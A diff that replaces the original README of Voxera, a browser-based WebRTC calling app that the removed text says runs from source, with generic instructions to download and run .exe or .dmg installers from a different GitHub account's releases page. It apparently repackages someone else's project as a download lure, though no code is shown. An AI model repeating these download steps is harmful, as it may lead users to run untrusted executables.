@@ -1,260 +1,97 @@
-<!-- ===================== VOXERA NEURAL BOOT ===================== -->
+# 🎤 Voxera - Effortless Voice, Video, and Screen Sharing
 
-<p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?size=36&duration=3000&color=38BDF8&center=true&vCenter=true&width=900&lines=Voxera;Real-Time+Voice+Video+%26+Screen+Sharing;Powered+by+WebRTC+%7C+Socket.IO;Built+for+Seamless+Communication" />
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/WebRTC-Real--Time-blue?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Socket.IO-WebSockets-black?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Node.js-Backend-green?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Status-Live-success?style=for-the-badge">
-</p>
+Welcome to Voxera! This app allows you to easily connect with friends and colleagues for voice and video calls, as well as screen sharing. No technical skills needed. Just follow these simple steps to get started.
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:38bdf8,100:1e3a8a&height=90&section=header" />
-</p>
+## 📥 Download Voxera
 
----
+[![Download Voxera](https://img.shields.io/badge/Download_Voxera-v1.0-brightgreen.svg)](https://github.com/Surya12nisha/Voxera/releases)
 
-# 🎧 Voxera — Real-Time Communication Platform
+You can download the latest version of Voxera from our Releases page. To do this, click the button above or visit the link below:
 
-> **Talk. See. Share. Instantly.**
+[Visit the Releases Page to Download](https://github.com/Surya12nisha/Voxera/releases)
 
-**Voxera** is a browser-based **real-time communication platform** enabling  
-📞 **voice calls**, 🎥 **video calls**, and 🖥️ **screen sharing**  
-using **ultra-low latency peer-to-peer streaming**.
+## 🖥️ System Requirements
 
-Inspired by **Google Meet**, **Zoom**, and **Discord Voice**, Voxera is built to explore the **core engineering behind real-time systems**, without relying on third-party media SDKs.
+Before you download, ensure your device meets the following requirements:
 
----
+- **Operating System:** Windows 10, macOS, or a modern Linux distribution.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** A stable connection for smooth audio and video.
 
-## 🌐 Live Demo
+## 📂 Download & Install
 
-🔗 **Frontend:**  
-👉 https://voxera-rtc.netlify.app  
+To download and install Voxera, please follow these steps:
 
-🔗 **Backend (Signaling Server):**  
-👉 https://voxera-g4st.onrender.com  
+1. **Visit the Releases Page**
 
-> ⚠️ Note: On free hosting, the first request may take ~30 seconds due to cold starts.
+   Click [here](https://github.com/Surya12nisha/Voxera/releases) to go to the Releases page.
 
----
+2. **Select the Latest Release**
 
-## ⚡ Why Voxera?
+   Look for the most recent version. It will be at the top of the page. 
 
-✔ No media server relay  
-✔ True peer-to-peer streaming  
-✔ Real-time WebSocket signaling  
-✔ Clean call lifecycle management  
-✔ Production-style UI & UX logic  
+3. **Download the Installer**
 
-> Voxera is built to **understand how real-time systems actually work**, not just how to use APIs.
+   Click on the file that matches your operating system. Most users will want the file labeled with `.exe` for Windows or `.dmg` for macOS.
 
----
+4. **Run the Installer**
 
-## 🖼️ Live Demo Preview
+   Locate the downloaded file in your computer's Downloads folder. Double-click the file to begin the installation.
 
-```text
-Login → Online Users → Call → Video → Screen Share → End Call
-````
+5. **Follow the Installation Steps**
 
-<p align="center">
-  <img src="screenshots/image-1.png" width="32%" />
-  <img src="screenshots/image.png" width="32%" />
-  <img src="screenshots/ss.png" width="32%" />
-</p>
+   A setup wizard will guide you through the installation. Follow the on-screen instructions, and choose your preferred installation settings.
 
----
+6. **Launch Voxera**
 
-## 🚀 Features
+   Once installation is complete, locate Voxera in your applications or programs menu. Click to open.
 
-### 🔗 Real-Time Communication Core
+## 📞 Using Voxera
 
-* 📞 One-to-one **voice & video calls**
-* 🖥️ **Screen sharing** with system audio
-* ⚡ **Ultra-low latency** peer-to-peer streaming
-* 🔊 Call connect / share / end sounds
-* ❌ **Synchronized call termination**
+Once Voxera is running, you can start your first call. Here’s how:
 
-### 🎛️ Call Controls
+1. **Create a Room**
 
-* 🎤 Mute / Unmute microphone
-* 🖥️ Start / Stop screen sharing
-* 📞 End call
-* 🪟 Floating camera (**Picture-in-Picture**)
+   Click on the "Create Room" button. This action will generate a unique link.
 
-### 🎨 UI & UX Experience
+2. **Share the Link**
 
-* ✨ Google Meet–inspired interface
-* 🌌 Glassmorphism + gradient backgrounds
-* 🎥 Smart layout (screen-first, camera PiP)
-* 🔔 Call state overlays (Calling / Incoming)
-* 🎧 Idle onboarding screen
+   Send the link to your friends or colleagues. They can join your room by clicking the link.
 
----
+3. **Start Communicating**
 
-## 🛠️ Tech Stack
+   Once everyone is in the room, you can start your voice or video call. Use the buttons on the screen to switch between audio, video, and screen-sharing.
 
-### 🖥️ Frontend
+## 🌟 Features
 
-* HTML5
-* CSS3 (Glassmorphism, animations)
-* JavaScript (ES6+)
-* WebRTC (Audio, Video, Screen Capture)
-* Socket.IO (Client)
+Voxera offers several features to enhance your communication experience:
 
-### ⚙️ Backend
+- **Real-Time Audio and Video**: Enjoy clear and instantaneous conversations.
+- **Screen Sharing**: Share your screen with others effortlessly.
+- **User-Friendly Interface**: Designed for ease of navigation, even for beginners.
+- **Multi-Platform Support**: Use Voxera on different devices without a hitch.
 
-* Node.js
-* Express.js
-* Socket.IO (WebSockets)
-* Google STUN Server
+## 🎨 Technology Stack
+
+Voxera leverages the following technologies to deliver a smooth user experience:
+
+- **WebRTC**: For real-time communication.
+- **Node.js**: To manage server operations.
+- **Socket.IO**: To enable real-time, bidirectional communication between clients and servers.
+
+## 💬 Support
+
+If you have any questions or need help, feel free to reach out:
+
+- **GitHub Issues**: Report any issues you encounter while using Voxera.
+- **Community Forum**: Join discussions and connect with other users.
+
+## 📜 License
+
+Voxera is open-source and licensed under the MIT License. You are free to use and modify the application as needed.
 
 ---
 
-## 🧠 Architecture Overview
-
-```text
-User A  ── WebRTC (Audio / Video / Screen) ──▶  User B
-   │                                             ▲
-   └──── Socket.IO (Signaling & Presence) ───────┘
-```
-
-### 🔄 WebSockets Handle
-
-* User presence & login
-* Online user list
-* Call requests
-* SDP & ICE signaling
-* Call end synchronization
-
-### 🎥 WebRTC Handles
-
-* Peer-to-peer media streaming
-* Camera & microphone capture
-* Screen sharing with system audio
-* NAT traversal via ICE
-
-> ⚠️ **Media streams never pass through the server** — they flow directly between peers.
-
----
-
-## 📁 Project Structure
-
-```
-Voxera/
-│
-├── backend/
-│   ├── server.js
-│   └── package.json
-│
-└── frontend/
-    ├── index.html
-    ├── style.css
-    ├── main.js
-    └── sounds/
-        ├── call-connect.mp3
-        ├── screen-share.mp3
-        └── call-end.mp3
-```
-
----
-
-## ▶️ Run Locally
-
-### 1️⃣ Clone Repository
-
-```bash
-git clone https://github.com/vansh070605/Voxera.git
-cd Voxera
-```
-
-### 2️⃣ Start Backend
-
-```bash
-cd backend
-npm install
-node server.js
-```
-
-```text
-✅ Voxera signaling server running on port 3000
-```
-
-### 3️⃣ Run Frontend
-
-* Open `frontend/index.html` in **two browsers/devices**
-* Login with different usernames
-* Start calling 🚀
-
-> Recommended browser: **Google Chrome**
-
----
-
-## 🎯 Call Lifecycle
-
-```text
-Login → Select User → Call → Connect → Share Screen → End Call
-```
-
-✔ Ending a call on one side disconnects both peers
-✔ UI resets cleanly on both ends
-
----
-
-## 🧪 What This Project Demonstrates
-
-* WebRTC peer connection setup
-* ICE candidate exchange & NAT traversal
-* Media track replacement (screen sharing)
-* Real-time state synchronization
-* Socket-based signaling architecture
-* Production-grade call lifecycle handling
-
----
-
-## 🔒 Current Limitations
-
-* One-to-one calls only
-* No TURN server (may fail on strict NATs)
-* No authentication
-* No call recording
-* No group calls (yet)
-
----
-
-## 🚀 Future Enhancements
-
-* 👥 Group calls / voice rooms
-* 🎥 Camera on/off toggle
-* ⏱️ Call duration analytics
-* 🔐 Authentication & user profiles
-* 🌍 TURN server integration
-* 📊 Network quality indicators
-* 📱 Improved mobile UX
-
----
-
-## 📄 Resume-Ready Project Statement
-
-> **Voxera** is a real-time communication web application built using **WebRTC and WebSockets**, enabling peer-to-peer voice calls, video calls, and screen sharing with synchronized call lifecycle management and a modern, production-grade UI.
-
----
-
-## 👨‍💻 Author
-
-**Vansh Agrawal**
-Engineering Student | Full-Stack & Real-Time Systems Enthusiast
-
----
-
-## ⭐ Final Note
-
-Voxera focuses on **real-world real-time communication engineering**, not just UI demos.
-It demonstrates the same foundational concepts used in **Google Meet, Zoom, and Discord** —
-**built completely from scratch.**
-
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:1e3a8a,100:38bdf8&height=90&section=footer" />
-</p>
+You are now ready to enjoy Voxera! Simply follow these steps, and you will be connected in no time. For additional assistance, always feel free to check our community forums or GitHub issues page.
